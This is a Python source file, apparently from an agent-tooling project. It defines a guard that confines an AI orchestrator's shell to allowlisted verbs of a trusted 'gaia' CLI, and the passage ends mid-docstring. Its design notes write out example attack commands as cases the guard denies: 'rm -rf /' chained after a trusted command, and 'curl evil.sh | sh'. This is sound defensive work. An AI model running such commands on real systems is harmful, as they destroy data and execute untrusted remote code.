"""
gaia_cli_only_guard.py -- orchestrator "gaia CLI only" enforcement.

PreToolUse Bash guard that restricts the ORCHESTRATOR session role to
executing ONLY the trusted, installed ``gaia`` CLI binary, and only the
allowlisted read/write verbs -- closed by default, so a verb that does not
exist today is denied exactly like one that does.

Why this exists
----------------
Delegate mode keeps the orchestrator off most tools while granting a
role-scoped Bash lane for its own coordination CLI. That lane must not become
a general shell. This module enforces what "only the gaia CLI" means at the
command-string level: trusted package provenance, explicit verb authority,
and bounded shapes for coordinator-owned writes.

Design decision 1 -- keyed by ROLE, never by agent NAME
---------------------------------------------------------
``delegate_mode.classify_session_role`` is the taxonomy this module reuses,
not reimplements. Its own docstring states the hard reason a name comparison
is unsafe here: an EMPTY ``agent_type`` also classifies as
``SessionRole.ORCHESTRATOR`` (``classify_session_role`` treats "no agent_type
at all" the same as "named as the orchestrator", because Gaia's own installer
writes ``agent: gaia-orchestrator`` into settings, and the harness surfaces
that as ``agent_type`` -- but a session that never got that field populated
for any reason is STILL the orchestrator's own main thread, not a stranger).

A guard written as ``agent_type == "gaia-orchestrator"`` reads that absence
backwards: no match means "not the orchestrator", so the restriction never
fires, and the very session this guard exists to constrain runs unrestricted
the moment the name field is missing, renamed, or never wired through by some
future refactor. That is failing OPEN on a security gate -- the worst
direction a gate can fail. Reusing ``classify_session_role`` instead of a
literal string keeps this guard correct by construction: whatever the harness
sends, the SAME three-way classification used everywhere else in Gaia
(SUBAGENT / ORCHESTRATOR / NAMED_SPECIALIST) decides who this is, and an
absent field lands on the side that gets gated, not the side that gets a free
pass. This is also why ``check()`` below takes the raw ``hook_payload`` dict
rather than a pre-extracted ``is_orchestrator`` boolean: any intermediate
flattening is one more place the same "empty field reads as false" mistake
could be reintroduced between the harness and this guard.

NAMED_SPECIALIST and SUBAGENT are deliberately NOT restricted here -- the
task this guard exists for is scoped to the orchestrator role alone. A
dispatched subagent already runs with full tool access by design (delegate
mode's own SUBAGENT skip), and a ``--agent <specialist>`` main thread is
already denied nearly everything by delegate mode itself; neither needs this
guard layered on top, and folding them in would blur what this module is
answering ("is the orchestrator only running its own CLI?") with a question
delegate mode already owns.

Design decision 2 -- identity is PACKAGE PROVENANCE, not a path
--------------------------------------------------------------------------
``subagent_memory_write_guard.py`` (the structural precedent for this module)
resolves the invoked binary by BASENAME: it strips a token down to its last
path component and compares that to the literal string ``"gaia"``. That is
adequate for its own purpose (deciding whether a `gaia memory <verb>` shape
is present anywhere in the command, as a shape check), but it is exactly the
wrong tool for an identity check, and this module is forbidden from copying
it for that reason: ANY file named ``gaia`` anywhere on the filesystem --
``/tmp/x/gaia``, a script dropped in the workspace, a shadowing entry earlier
on ``$PATH`` -- has the basename ``gaia`` and would satisfy that comparison.
A guard whose entire job is "only the real gaia CLI may run" cannot itself be
fooled by a same-named file; that would be a key left under the doormat.

The first design overcorrected in the opposite direction: it realpath'd the
invoked token and required EXACT equality against the one ``bin/gaia`` that
ships alongside this very hook module (computed from ``__file__``). That
equality is a property of a LAYOUT, not of identity, and a live install
disproved it: a real workspace runs the hook module out of the installed
pnpm dev-pack under ``node_modules`` (``.claude/hooks`` symlinks there),
while the ``$PATH`` launcher is an npm-global symlink chain that resolves to
the SOURCE TREE's ``bin/gaia`` -- two genuine, simultaneously installed
copies of the same package, two distinct real paths, so the guard denied the
legitimate CLI, including its own. Multiple concurrent genuine installs are
the NORMAL condition of this workspace (the ``.pnpm`` store carries one new
hash-named package root per dev-pack build), which also rules out the
obvious repair of a trusted-locations SET: any enumerated set is stale after
the next ``pack``, on the next machine, and for the next layout -- it rots
by construction, and a rotten allowlist on a security gate fails open or
fails useless.

So identity is verified by PROVENANCE: *the trusted gaia CLI is any file
that a genuinely installed gaia package -- the same npm package this hook
module itself ships in, by name -- declares as its own ``gaia`` executable.*

  1. The token in the binary position of a command component must already be
     an ABSOLUTE path in the command text as written (``os.path.isabs``).
     A bare word (``gaia``) relies on a ``$PATH`` lookup this guard does not
     perform: resolving it here would mean trusting the AMBIENT environment
     at hook-analysis time, which need not be the same environment the
     command actually runs under, and could itself have been poisoned by an
     earlier command in the same session (e.g. a prior ``export PATH=...``).
     A relative path (``./gaia``, ``bin/gaia``) is cwd-dependent, and this
     guard does not track ``cd`` state (that is ``bash_validator``'s
     compound-cwd threading, out of this module's scope) -- resolving a
     relative token would mean guessing a cwd this module cannot verify.
     Both are rejected outright rather than approximated.
  2. The absolute token is resolved with ``os.path.realpath`` (follows every
     symlink in the chain) to a real file R. R must exist.
  3. Walking UP from R, the NEAREST directory containing a ``package.json``
     is taken as R's declaring package root -- npm's own resolution rule.
     No ``package.json`` above R means R belongs to no package: denied.
  4. That manifest's ``name`` must equal ``TRUSTED_PACKAGE_NAME`` -- the
     ``name`` read at import time from the ``package.json`` of the package
     THIS module ships in (``__file__`` walked up to the package root). The
     expected name is never hard-coded: the module asks "what package am I?"
     and demands the invoked binary belong to a package of the same name, so
     a rename of the npm package updates both sides of the comparison in the
     same commit. If this module's own manifest is missing or unreadable,
     ``TRUSTED_PACKAGE_NAME`` is ``None`` and EVERY candidate is denied --
     failing closed, never open.
  5. The manifest's own ``bin`` entry for ``gaia`` must realpath-resolve to
     EXACTLY R. This is the load-bearing link: it is not enough for R to
     live somewhere inside a gaia package (that would trust every file in
     the tree); the package itself must declare R as its gaia executable.

  Steps 2-5 fail closed on every doubt: unreadable or unparseable manifest,
  name mismatch, missing/odd ``bin`` field, ``bin`` resolving elsewhere, and
  any ``OSError`` all deny. A pnpm-global SHELL-SHIM launcher (pnpm writes a
  wrapper script, not a symlink, so its realpath is the shim itself, inside
  no gaia package) is also denied by construction -- fail closed; the lane
  there is to invoke the installed package's own ``bin/gaia`` path.

  Deliberately NOT chosen: content identity (hashing the invoked file
  against the sibling ``bin/gaia``). Two genuine installs need not be the
  same VERSION -- the incident layout ran dev-pack hooks against a launcher
  resolving into the source tree, and a stable-global-launcher-plus-dev-tree
  mix is routine -- so byte equality would re-break every mixed-version
  layout the day ``bin/gaia`` changes at all: the same "property of the
  layout mistaken for identity" bug, re-expressed as a property of the
  release cadence.

  Stated residual, within this guard's threat model: provenance reads the
  filesystem, so an actor who can WRITE the filesystem could fabricate a
  package tree that passes it. That actor is outside this guard's model --
  the orchestrator lane this module gates has no file-writing tool (that is
  delegate mode's job) and the allowlisted gaia verbs write rows, not files;
  and the fabrication power is exactly the power that already defeated the
  old design (overwriting the single trusted ``bin/gaia`` IN PLACE passed
  the path-equality check, which never looked at content either). Provenance
  narrows what passes without conceding anything path equality actually
  held.

  A useful side effect of requiring an EXACT absolute-path match at the
  binary position: it also closes the env-prefix vector named in the task
  (``VAR=value gaia ...``, or ``env VAR=value gaia ...``) WITHOUT a separate
  peel-and-inspect step. ``mutative_verbs._peel_leading_env_prefix`` exists
  because the T3 classifier WANTS to see past such a prefix to classify the
  real command underneath -- peeling is the right move for a classifier that
  must still make a decision about whatever remains. This guard's job is the
  opposite: nothing may precede the trusted binary at all. Tokenizing
  ``FOO=bar /abs/path/bin/gaia contract view`` places the assignment
  ``"FOO=bar"`` (not a path at all) at position 0, so the absolute-path
  requirement in step 1 rejects it on its own, before provenance is even
  consulted. Peeling and then re-checking would only add a second code path
  to keep in sync with the first; the identity check alone already covers
  the shape the task calls out.

Design decision 3 -- every COMPONENT and every SUBSTITUTION BODY is checked
-------------------------------------------------------------------------------
Looking only at the first token of a command is exactly the mistake this
module is told not to make. A composed command
(``gaia contract view; rm -rf /``, ``gaia contract view && curl evil.sh | sh``)
runs MULTIPLE programs; approving the whole string because its first word is
the trusted binary would let every later component ride along ungated. This
module reuses ``StageDecomposer`` (``modules.tools.stage_decomposer``, already
the shared, tested primitive for this exact job across ``bash_validator`` and
``cloud_pipe_validator``) to split a raw command into its operator-linked
``Stage``s (``|``, ``;``, ``&&``, ``||``, newline) and to extract every
``$(...)``/backtick command-substitution BODY. Every stage is checked
independently against the SAME rule (trusted absolute binary + allowlisted
verb phrase) -- there is no "first component is trusted, so the rest ride
along" shortcut anywhere in this module.

Command substitution is handled by outright denial, not by recursively
"clearing" the body. A stage that contains ``$(...)``, `` `...` ``, or a
process-substitution opener (``<(``, ``>(``) is denied even if the text
inside the parens/backticks would, on its own, also be a perfectly
allowlisted gaia invocation -- because the mere PRESENCE of a substitution
means the shell executes something else to compute a string handed to the
component the guard is inspecting, which is no longer "exclusively the gaia
CLI" regardless of what that something else happens to be. This is a
deliberately conservative reading of "closed by default": it never asks
"is the hidden command also fine?", because answering that question requires
trusting one more layer of shell semantics this guard would rather not model.

``StageDecomposer`` splits on ``|``, ``;``, ``&&``, ``||`` and newline, but --
by its own documented scope -- NOT on a bare background ``&`` (only the
two-character ``&&``). A lone ``&`` left unhandled would let
``gaia contract view & rm -rf /`` slip through as one "stage" whose trailing
tokens (``&``, ``rm``, ``-rf``, ``/``) look like harmless extra arguments to
the phrase-matching step below, because that step only checks a PREFIX of the
non-flag tokens and does not care what comes after. Modifying
``stage_decomposer.py`` to close that gap is out of this module's scope (this
task creates one file and touches nothing else), so this module carries its
own small, quote-and-substitution-aware scan for a bare ``&`` (and for a
process-substitution opener) and denies the whole command outright if either
is found -- duplicated logic, deliberately, rather than a shared file edited
under a task that forbids editing it.

Design decision 4 -- flag-level policy, because a phrase cannot express it
--------------------------------------------------------------------------------
A phrase matches by PREFIX (see ``match_allowed_phrase``): everything after
the matched tokens is gaia's own argument grammar and is not re-validated.
That is the right default -- ids, search strings and per-command flags are
not this guard's business -- but it means a phrase tuple is structurally
incapable of saying "this verb, but not with that flag". And one admitted
verb needs exactly that: ``gaia doctor`` is a read-only diagnostic EXCEPT
under ``--fix``, which rewrites the settings file and rebuilds the memory
FTS index.

``_READ_PHRASE_FORBIDDEN_FLAGS`` is that missing expressiveness, applied by
``_validate_read_flags`` in ``_check_stage`` BEFORE the write-shape gate, so
a forbidden flag is refused whichever allowlist the phrase came from.

Two properties of the flag scan are load-bearing, and both were measured
against argparse rather than assumed:

  * A forbidden flag matches by PREFIX of the flag, not by equality.
    ``allow_abbrev`` defaults to True and gaia's parsers do not disable it,
    so ``gaia doctor --fi`` and ``gaia doctor --f`` both parse to
    ``fix=True``. An equality check on ``"--fix"`` would have failed open on
    the two shortest spellings of the flag it exists to stop -- the same
    shape of hole as a classification entry that is present but unreachable.
  * The ``--flag=value`` form is split on its first ``=`` before matching, so
    ``--fix=true`` is recognized as ``--fix`` (argparse itself rejects that
    spelling for a store_true option, but the guard must not be the layer
    that depends on that), while ``--workspace=--fix`` is recognized as
    ``--workspace`` carrying a value and is NOT a false positive.

Deliberately NOT built here: the mirror table of REQUIRED flags. An earlier
design admitted ``gaia scan`` only with ``--dry-run``, which needed one --
and needed it to survive ``gaia scan --workspace me -- --dry-run``, where a
bare ``--`` demotes the flag to a positional and the command writes anyway.
That whole class of parsing subtlety disappeared with the policy it served:
``scan`` refreshes the workspace substrate the orchestrator coordinates
from, its identity already authorizes the CLI, and a narrower allowlist
would have removed a capability it needs without adding any safety. The
verb is admitted whole, as a write, in ``ALLOWED_WRITE_PHRASES``.

Scope of the check (categorical, NOT approvable)
--------------------------------------------------
Like ``subagent_memory_write_guard`` / ``gaia_db_write_guard``, this is a
categorical deny with no ``approval_id`` -- there is no T3-style grant that
lifts it. An orchestrator session has no legitimate reason to run a command
this guard rejects; the correct move is to dispatch a specialist, not to seek
consent for a wider shell.

This module IS wired into ``bash_validator.py``: ``BashValidator.validate()``
calls ``check()`` here as Phase 0, the very first statement of ``validate()``,
ahead of the empty-command check, footer stripping, the three write guards,
and normalization. The guard is live: delegate mode grants Bash only to the
orchestrator role, and Phase 0 evaluates its raw command.

Public API:
    TRUSTED_PACKAGE_NAME: Optional[str]
    ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]]
    ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]]
    ALLOWED_PHRASES: FrozenSet[Tuple[str, ...]]
    EXPLICITLY_DENIED_PHRASES: FrozenSet[Tuple[str, ...]]
    is_orchestrator_role(hook_payload) -> bool
    is_trusted_gaia_binary(token) -> bool
    check(command, hook_payload) -> tuple[bool, str | None]
"""

from __future__ import annotations

import json
import os
from typing import Any, Dict, FrozenSet, Optional, Tuple

from ..tools.stage_decomposer import StageDecomposer

# ---------------------------------------------------------------------------
# Trusted binary identity (Design decision 2 -- see module docstring)
# ---------------------------------------------------------------------------

# The real, on-disk directory containing THIS file, with every symlink in the
# chain resolved -- so the package root below is the root of whichever real
# package this module is running from (source tree, or an installed copy
# under node_modules that ``.claude/hooks`` symlinks into).
_MODULE_DIR = os.path.dirname(os.path.realpath(__file__))

# hooks/modules/security -> hooks/modules -> hooks -> <package root>
_PACKAGE_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(_MODULE_DIR)))


def _read_package_manifest(package_root: str) -> Optional[Dict[str, Any]]:
    """Return *package_root*'s parsed ``package.json`` dict, or None.

    None on any doubt -- missing file, unreadable, unparseable, or a JSON
    document that is not an object. Callers treat None as a denial.
    """
    manifest_path = os.path.join(package_root, "package.json")
    try:
        with open(manifest_path, encoding="utf-8") as fh:
            data = json.load(fh)
    except (OSError, ValueError):
        return None
    return data if isinstance(data, dict) else None


def _own_package_name() -> Optional[str]:
    """The npm package name this hook module itself ships in, or None."""
    manifest = _read_package_manifest(_PACKAGE_ROOT)
    if manifest is None:
        return None
    name = manifest.get("name")
    if isinstance(name, str) and name.strip():
        return name
    return None


# The identity anchor: not a path, the NAME of the package this module ships
# in, read from its own manifest at import time. None (own manifest missing
# or unreadable) makes is_trusted_gaia_binary() deny everything -- closed.
TRUSTED_PACKAGE_NAME: Optional[str] = _own_package_name()


def _find_declaring_package_root(real_file: str) -> Optional[str]:
    """Nearest ancestor directory of *real_file* containing a package.json.

    npm's own resolution rule: the nearest manifest wins, and the walk stops
    there -- a mismatching nearest manifest is a denial, never a reason to
    keep climbing toward a manifest that would match.
    """
    directory = os.path.dirname(real_file)
    while True:
        if os.path.isfile(os.path.join(directory, "package.json")):
            return directory
        parent = os.path.dirname(directory)
        if parent == directory:
            return None
        directory = parent


def _declared_gaia_bin(package_root: str, manifest: Dict[str, Any]) -> Optional[str]:
    """Realpath of the file *manifest* declares as its ``gaia`` executable.

    Handles npm's two ``bin`` forms: the object form (``{"gaia": "bin/gaia"}``,
    the form this package publishes) and the string form, which npm names
    after the package's unscoped basename -- accepted only when that basename
    is exactly ``gaia``. Anything else (missing ``bin``, no ``gaia`` entry,
    non-string value) returns None, which callers treat as a denial.
    """
    bin_field = manifest.get("bin")
    bin_rel: Optional[str] = None
    if isinstance(bin_field, dict):
        candidate = bin_field.get("gaia")
        if isinstance(candidate, str):
            bin_rel = candidate
    elif isinstance(bin_field, str):
        name = manifest.get("name")
        if isinstance(name, str) and name.rsplit("/", 1)[-1] == "gaia":
            bin_rel = bin_field
    if not bin_rel or not bin_rel.strip():
        return None
    return os.path.realpath(os.path.join(package_root, bin_rel))


def is_trusted_gaia_binary(token: str) -> bool:
    """Return True iff *token* is, by package provenance, the trusted gaia CLI.

    Trusted means: *token* is absolute as written, and its realpath is the
    very file that a genuinely installed package named
    :data:`TRUSTED_PACKAGE_NAME` declares as its own ``gaia`` executable
    (Design decision 2 -- steps 2-5). Rejects a bare word (no ``$PATH``
    lookup is performed), a relative path (cwd-dependent, and this module
    does not track ``cd`` state), a same-named file that belongs to no such
    package, and a file that merely lives INSIDE such a package without
    being its declared ``gaia`` bin entry. Fails closed on every doubt,
    including when this module's own package name could not be established.
    """
    if not token or not os.path.isabs(token):
        return False
    if TRUSTED_PACKAGE_NAME is None:
        return False
    try:
        real = os.path.realpath(token)
        if not os.path.isfile(real):
            return False
        package_root = _find_declaring_package_root(real)
        if package_root is None:
            return False
        manifest = _read_package_manifest(package_root)
        if manifest is None:
            return False
        if manifest.get("name") != TRUSTED_PACKAGE_NAME:
            return False
        declared = _declared_gaia_bin(package_root, manifest)
        return declared is not None and declared == real
    except OSError:
        return False


# ---------------------------------------------------------------------------
# Verb allowlists (Design decision "closed by default")
# ---------------------------------------------------------------------------
# Each entry is the exact token sequence of a subcommand PATH as gaia's own
# argparse subparsers name it (verified against bin/cli/*.py's add_parser
# calls, not guessed from convention) -- e.g. ("task", "gate", "list") for
# the three-level ``gaia task gate list``. Matching is by PREFIX against the
# tokens that follow the trusted binary (see match_allowed_phrase): anything
# after a matched phrase (an id, a search string, a per-command flag) is
# gaia's own argument grammar and is not re-validated here.

ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
    # `contract view`/`list`/`validate` were verified read-only by following
    # what `bin/cli/contract.py`'s `cmd_view`/`cmd_list`/`cmd_validate` CALL:
    # no INSERT/UPDATE/DELETE and no commit() reachable from any of the
    # three. `view`'s case needed a second look, and it used to fail it: with
    # no draft file on disk, `cmd_view`'s default `_load_target_draft(args)`
    # (`allow_adopt=True`) reached `_maybe_adopt_draft`, which SAVED a fresh
    # `_initial_envelope` to `contract_drafts/<id>.json` -- a real write to
    # disk, performed by a verb this allowlist classified as a read. Fixed:
    # `cmd_view` now resolves with `allow_adopt=False` and never calls
    # `_maybe_adopt_draft` at all; when no draft file exists it recovers the
    # row's `raw_handoff_json` through `_freshest_envelope` (read-only,
    # shared with `--harness-id` addressing) instead of fabricating and
    # persisting a blank one. `view` is pure read again, and this comment
    # reflects that fixed state, not the one measured before it.
    ("contract", "view"),
    ("contract", "list"),
    ("contract", "validate"),
    ("task", "list"),
    # `task show` is the single-task complement of `task list`: a mechanical
    # read of a task row, which the orchestrator's own identity already says
    # is its own to perform (a brief/plan/task/gate/contract/approval/
    # notification/memory row read never merits a subagent). It is also the
    # one place that legibly prints tasks.id -- the value the dispatch
    # contract's task_id=<N> token requires and that ORDER_NUM (the plan
    # position) must never be confused with. Read-only: bin/cli/task.py's
    # `_cmd_show` calls only gaia.store.writer.get_task_by_order, no write.
    ("task", "show"),
    ("task", "gate", "list"),
    ("plan", "show"),
    ("plan", "list"),
    ("brief", "show"),
    ("brief", "list"),
    ("brief", "deps"),
    ("brief", "search"),
    ("brief", "verify"),
    ("notifications", "list"),
    ("notifications", "show"),
    ("memory", "search"),
    ("memory", "show"),
    ("memory", "list"),
    ("memory", "stats"),
    ("memory", "get-relevant"),
    ("memory", "conflicts"),
    ("memory", "episode-show"),
    ("memory", "story"),
    ("history",),
    ("metrics",),
    ("approvals", "list"),
    ("approvals", "pending"),
    ("approvals", "show"),
    ("approvals", "history"),
    ("approvals", "stats"),
    # Substrate and installation diagnostics. Each was verified read-only by
    # following what it CALLS, not by grepping the module it lives in: no
    # INSERT/UPDATE/DELETE and no commit() in bin/cli/{doctor,status,defects,
    # query}.py, and the read handlers of the four grouped commands
    # (context._cmd_show/_cmd_get, workspace._cmd_current/_cmd_info,
    # evidence._cmd_show/_cmd_list, schedule._cmd_list/_cmd_show/_cmd_status)
    # reach the substrate only through gaia.store.reader / gaia.store.provider.
    # Grepping alone is not enough here: `paths` has no mutation marker in its
    # own module and still writes, one call down, which is why it sits in the
    # WRITE set below.
    #
    # ``doctor`` is the one exception to "the verb decides": it is read-only
    # EXCEPT under --fix, which is why it also appears in
    # _READ_PHRASE_FORBIDDEN_FLAGS below. Prefix matching cannot express that
    # on its own -- see Design decision 4.
    ("doctor",),
    ("status",),
    ("defects",),
    ("query",),
    ("context", "show"),
    ("context", "get"),
    # `get-contract` is the ONLY verb that can read a project-context
    # contract row (project_context_contracts, the same names an agent's
    # can_read/can_write kernel menu carries) -- a DIFFERENT namespace from
    # `show`/`get`'s workspace-shape --section. Verified read-only by
    # following what `bin/cli/context.py`'s `_cmd_get_contract` calls: two
    # SELECTs against `project_context_contracts` and nothing else -- no
    # INSERT/UPDATE/DELETE, no commit() reachable. Its own docstring states
    # the same: "Never mutates project_context_contracts -- the only write
    # path for that table is `move-contracts` (re-keying)", which stays in
    # EXPLICITLY_DENIED_PHRASES below, untouched by this entry.
    ("context", "get-contract"),
    # `project` is the one-project ficha: `projects` row + `project_facets` +
    # the matching `project_identity` contract entry + a curated-memory INDEX
    # (slug + description, never a body). Verified read-only by following
    # what `bin/cli/context.py`'s `_cmd_project` calls: SELECTs against
    # `projects`, `project_facets`, `project_context_contracts` and `memory`
    # and nothing else -- no INSERT/UPDATE/DELETE, no commit(), no telemetry
    # bump (unlike `memory show`'s deliberate_count, deliberately not called
    # here so this verb's own invariant -- "never writes" -- holds without
    # exception). This closes the gap named in the task that added it: facets
    # are not in `get_context()`'s workspace shape, are not a
    # project-context contract themselves, and `query` (raw SQL) is denied to
    # the orchestrator -- so before this entry there was no read path to a
    # project's facets in this lane at all.
    ("context", "project"),
    ("workspace", "current"),
    ("workspace", "info"),
    ("evidence", "show"),
    ("evidence", "list"),
    ("schedule", "list"),
    ("schedule", "show"),
    ("schedule", "status"),
})

ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
    # ``scan`` refreshes the (workspace, project) rows that ARE the
    # orchestrator's coordination context -- keeping that substrate current is
    # its own job, not a specialist's. It is listed as a WRITE because it is
    # one: bin/cli/scan.py calls classify_scan(root, workspace,
    # apply=not dry_run), so its DEFAULT mode persists. It is admitted
    # deliberately and without a flag condition (the orchestrator's identity
    # is what authorizes the CLI; a narrower allowlist would only remove a
    # capability it needs), and it carries no bounded-shape check in
    # _validate_orchestrator_write -- gaia's own argparse owns its grammar.
    ("scan",),
    # The same scan by its other spelling: context._cmd_scan delegates
    # in-process to bin/cli/scan.py's cmd_scan. Admitting one and denying the
    # other would gate a route, not an effect.
    ("context", "scan"),
    # ``paths`` only PRINTS resolved paths, and still belongs here rather than
    # in the read set: all three of its handlers call ensure_layout(), which
    # os.makedirs() the ~/.gaia layout (data, workspaces, logs, events, cache,
    # scratch) at mode 0700. Idempotent, confined to gaia's own state root,
    # deleting nothing and downgrading no permission -- and the same root is
    # already created by gaia.store.writer._connect for every DB-touching verb
    # in this lane, so refusing `paths` over it would be incoherent. It is
    # admitted; what is not admitted is calling it a read.
    ("paths",),
    ("brief", "new"),
    ("brief", "edit"),
    ("brief", "set-status"),
    ("brief", "ac", "add"),
    ("brief", "ac", "edit"),
    ("brief", "ac", "remove"),
    ("plan", "set-status"),
    ("task", "set-status"),
    ("notifications", "ack"),
    ("memory", "add"),
    ("memory", "append"),
    ("memory", "reclassify"),
    ("memory", "link"),
    ("memory", "checkpoint"),
})

ALLOWED_PHRASES: FrozenSet[Tuple[str, ...]] = ALLOWED_READ_PHRASES | ALLOWED_WRITE_PHRASES

# Named on purpose, even though default-deny already rejects anything not in
# ALLOWED_PHRASES: these are the verbs someone is most likely to add to the
# allowlist later without re-reading this file's reasoning -- a plausible
# "just let the orchestrator ack a notification too" kind of change. Keeping
# them enumerated, with the reason attached, is the tripwire that makes that
# future edit a deliberate decision instead of an accidental widening.
# Task/gate design, approval mutation, destructive brief/plan operations,
# memory correction/deletion, and contract authorship belong to specialist or
# consent-governed paths. Coordinator-owned brief and lifecycle writes are
# separately allowlisted and shape-checked below.
#
# The approvals six split cleanly along the read/write line this guard
# enforces, and that line is NOT the same line security-tiers draws for T3:
# per security-tiers, ``revoke``/``reject``/``reject-all``/``clean`` are
# themselves NOT T3 (they only revoke or discard a grant Gaia itself issued,
# never reaching outside the local approval store -- see
# CONSENT_REDUCING_SUBCOMMAND_EXCEPTIONS), while ``approve`` stays T3 because
# it grants capability without the AskUserQuestion flow. But this guard is
# narrower than the T3 gate: it allows the orchestrator's bare CLI lane only
# the verbs that read an approval's state back, never one that writes a row
# in the approvals store -- and all six of these write a row (a grant, a
# replay-of-execution, or a discard), whether or not that write also happens
# to need the user's consent. So all six stay denied here, deliberately, for
# a reason narrower than "is this T3": approving/replaying GRANT capability,
# revoking/rejecting/reject-all/clean DISCARD or clear it, and every one of
# those six is still a write to state this guard's allowlist does not open,
# even the ones security-tiers itself does not gate behind approval.
EXPLICITLY_DENIED_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
    ("task", "add"),
    ("task", "remove"),
    ("task", "reorder"),
    ("task", "gate", "add"),
    ("task", "gate", "remove"),
    ("task", "gate", "set-status"),
    ("brief", "delete"),
    ("plan", "save"),
    ("plan", "delete"),
    ("approvals", "approve"),
    ("approvals", "replay"),
    ("approvals", "revoke"),
    ("approvals", "reject"),
    ("approvals", "reject-all"),
    ("approvals", "clean"),
    ("memory", "edit"),
    ("memory", "delete"),
    ("contract", "set"),
    ("contract", "add"),
    ("contract", "fill"),
    ("contract", "finalize"),
    # Destructive substrate surgery. Admitting `context show`/`context get`
    # above opens the `context` namespace to the reader's eye; these are the
    # siblings in that same namespace that delete or relocate rows, and they
    # are named here so the next person widening `context` has to step over
    # them on purpose. (`context scan` is deliberately NOT here: it is the
    # same substrate refresh as top-level `scan`, which the orchestrator owns,
    # and it is allowlisted alongside it above.)
    ("context", "wipe"),
    ("context", "prune-workspaces"),
    ("context", "move-contracts"),
    ("context", "move-memory"),
    ("context", "move-project"),
    ("workspace", "merge"),
    ("evidence", "add"),
    # Schedule's desired state and its materialization into the OS scheduler:
    # `list`/`show`/`status` read it, these three write it (and `sync` reaches
    # outside gaia entirely, into crontab).
    ("schedule", "register"),
    ("schedule", "remove"),
    ("schedule", "sync"),
    # `release check` reads as a verification verb and is not one: it runs
    # `npm pack`, installs into a sandbox, runs `claude plugin validate` and
    # `npm test`, and finishes with a convergence write. `release publish`
    # ships to the registry. Both belong to a governed release path.
    ("release", "check"),
    ("release", "publish"),
    # Installation lifecycle: these rewrite the installed plugin, the settings
    # files, and the on-disk substrate. The orchestrator coordinates; it does
    # not re-install the system it is running inside.
    ("install",),
    ("update",),
    ("uninstall",),
    ("cleanup",),
    ("dev",),
})


def match_allowed_phrase(
    candidate: Tuple[str, ...],
    phrases: FrozenSet[Tuple[str, ...]] = ALLOWED_PHRASES,
) -> Optional[Tuple[str, ...]]:
    """Return the phrase in *phrases* that is a prefix of *candidate*, else None.

    Matching is by PREFIX, not exact-length equality: ``("memory", "show",
    "42")`` still matches ``("memory", "show")`` because the trailing ``"42"``
    is a positional argument (the id), not a further subcommand. Phrase
    tuples of different arities never collide under this rule -- a 2-tuple
    and a 3-tuple are only ever compared against candidate slices of their
    own length.
    """
    for phrase in phrases:
        if candidate[: len(phrase)] == phrase:
            return phrase
    return None


# ---------------------------------------------------------------------------
# Composition hazards StageDecomposer does not surface on its own
# (Design decision 3 -- see module docstring)
# ---------------------------------------------------------------------------

def _find_composition_hazard(command: str) -> Optional[str]:
    """Scan *command* for a bare background ``&`` or a process-substitution
    opener (``<(`` / ``>(``), outside quotes and outside ``$(...)``/backtick
    substitution bodies (those are already denied separately by their mere
    presence -- this scan exists for the hazards a substitution check does
    NOT cover).

    Returns a short reason string naming the hazard, or None when clean.

    This duplicates the quote/paren/backtick tracking in
    ``StageDecomposer._split_with_operators`` rather than extending that
    shared file -- this task creates exactly one new file and edits nothing
    else, so a real gap in a shared parser (it does not split on a bare
    ``&``) is closed here, locally, instead of there.
    """
    in_single = False
    in_double = False
    paren_depth = 0
    backtick_depth = 0
    i = 0
    n = len(command)

    while i < n:
        ch = command[i]

        if ch == "\\" and not in_single and i + 1 < n:
            i += 2
            continue

        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue

        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue

        if in_single or in_double:
            i += 1
            continue

        if ch == "$" and i + 1 < n and command[i + 1] == "(":
            paren_depth += 1
            i += 2
            continue

        if ch == "(" and paren_depth > 0:
            paren_depth += 1
            i += 1
            continue

        if ch == ")" and paren_depth > 0:
            paren_depth -= 1
            i += 1
            continue

        if ch == "`":
            backtick_depth = 0 if backtick_depth else 1
            i += 1
            continue

        if paren_depth > 0 or backtick_depth > 0:
            i += 1
            continue

        if ch in ("<", ">") and i + 1 < n and command[i + 1] == "(":
            return "process substitution (`<(` / `>(`) detected"

        if ch == "&":
            prev = command[i - 1] if i > 0 else ""
            nxt = command[i + 1] if i + 1 < n else ""
            if prev == ">":
                # File-descriptor duplication (`>&`, e.g. `2>&1`), not
                # background execution -- mirrors the same exclusion in
                # `bash_validator._FD_DUP_RE` and the lookbehind/lookahead in
                # `cloud_pipe_validator.UNIVERSAL_VIOLATIONS`'s "background"
                # entry (`(?<![>&])&(?!&)`).
                i += 1
                continue
            if nxt == "&":
                i += 2
                continue
            return "bare background operator (`&`) detected"

        i += 1

    return None


# ---------------------------------------------------------------------------
# Role gate (Design decision 1 -- see module docstring)
# ---------------------------------------------------------------------------

def is_orchestrator_role(hook_payload: Dict[str, Any]) -> bool:
    """Return True iff *hook_payload* classifies as the ORCHESTRATOR role.

    Delegates entirely to ``delegate_mode.classify_session_role`` -- the one
    place Gaia's (agent_id, agent_type) taxonomy lives -- rather than
    inspecting either field directly here. Imported lazily (function-local),
    matching the convention already used at this module's real call site
    (``hooks/adapters/claude_code.py`` imports
    ``modules.orchestrator.delegate_mode`` the same way) and avoiding any
    import-order assumption between the two packages.
    """
    from ..orchestrator.delegate_mode import SessionRole, classify_session_role

    return classify_session_role(hook_payload) is SessionRole.ORCHESTRATOR


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def check(
    command: str,
    hook_payload: Dict[str, Any],
) -> Tuple[bool, Optional[str]]:
    """Main entrypoint for PreToolUse Bash guard integration.

    Args:
        command: The Bash command line about to run.
        hook_payload: The full stdin JSON dict from the harness (the same
            shape ``delegate_mode.classify_session_role`` expects) -- NOT a
            pre-extracted role flag. See Design decision 1 above for why the
            raw payload is required here rather than a derived boolean.

    Returns:
        (allowed, reason)
        - (True, None) when the caller is not the ORCHESTRATOR role (this
          guard does not restrict SUBAGENT or NAMED_SPECIALIST), or the
          command is a composition where every component is a trusted,
          absolute-path gaia invocation of an allowlisted verb phrase.
